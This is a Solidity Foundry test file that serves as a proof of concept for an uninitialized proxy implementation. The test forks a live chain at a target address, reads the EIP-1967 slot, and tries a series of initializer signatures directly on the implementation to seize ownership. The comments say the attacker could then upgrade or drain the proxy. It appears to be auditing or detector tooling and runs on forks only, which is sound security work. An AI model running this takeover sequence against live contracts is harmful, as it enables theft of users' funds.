// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Uninitialized implementation behind a proxy
/// @notice Detector: unprotected-initializer / bytecode-proxy. The proxy
///         delegates to an implementation that was NEVER initialized, so
///         ANYONE can call initialize() on the implementation DIRECTLY
///         (bypassing the proxy) and become its owner -- then upgrade the
///         proxy or drain it.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. Reads the EIP-1967 implementation slot.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    address internal impl;
    // EIP-1967 implementation slot: keccak256("eip1967.proxy.implementation") - 1
    bytes32 public constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// @dev Fingerprint of the state a direct initialize() on the implementation
    ///      would move: the implementation's owner() view and its raw slot 0.
    function _observe() internal view returns (uint256) {
        (bool ok, bytes memory ret) = impl.staticcall(abi.encodeWithSignature("owner()"));
        return uint256(keccak256(abi.encode(ok, ret, vm.load(impl, bytes32(0)))));
    }

    /// Try each plausible entry point and accept the first that changes the
    /// OBSERVABLE -- never the first that returns. A no-op or already-guarded
    /// function returns successfully and changes nothing, so judging by the call
    /// result reports "not reproduced" for a vulnerability that exists under
    /// another name.
    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        vm.prank(attacker);
        (bool ok,) = impl.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (ok && _observe() != before) return label;
        return "";
    }

    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
        address[] memory one = new address[](1);
        one[0] = attacker;

        used = _attempt(
            attacker,
            before,
            "initialize(address)",
            abi.encodeWithSignature("initialize(address)", attacker)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "initialize(address,address)",
            abi.encodeWithSignature("initialize(address,address)", attacker, attacker)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker, before, "initialize()", abi.encodeWithSignature("initialize()")
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "initialize(address[])",
            abi.encodeWithSignature("initialize(address[])", one)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker, before, "init(address)", abi.encodeWithSignature("init(address)", attacker)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "initWallet(address[])",
            abi.encodeWithSignature("initWallet(address[])", one)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "init(address[])",
            abi.encodeWithSignature("init(address[])", one)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "init()", abi.encodeWithSignature("init()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "initialize(address,bytes)",
            abi.encodeWithSignature("initialize(address,bytes)", attacker, bytes(""))
        );
        if (bytes(used).length > 0) return used;
        return "";
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        impl = address(uint160(uint256(vm.load(target, IMPLEMENTATION_SLOT))));
        console.log("implementation:", impl);
        require(impl != address(0), "no EIP-1967 implementation slot -- not a standard proxy");

        // Initialize the implementation DIRECTLY, not through the proxy.
        uint256 before = _observe();
        string memory used = _tryEntry(attackerEOA, before);
        console.log("entry point that changed state:", used);

        uint256 afterState = _observe();
        uint256 delta = afterState != before ? 1 : 0;
        assertGt(
            delta,
            0,
            "no initializer variant changed the implementation's owner observable. Tried initialize(address), initialize(address,address), initialize(), initialize(address[]), init(address), initWallet(address[]), init(address[]), init(), initialize(address,bytes). This does NOT establish safety: the implementation may be guarded by an `initializer` modifier or already initialized, named differently, take other arguments, or the owner may live in another slot."
        );
    }
}
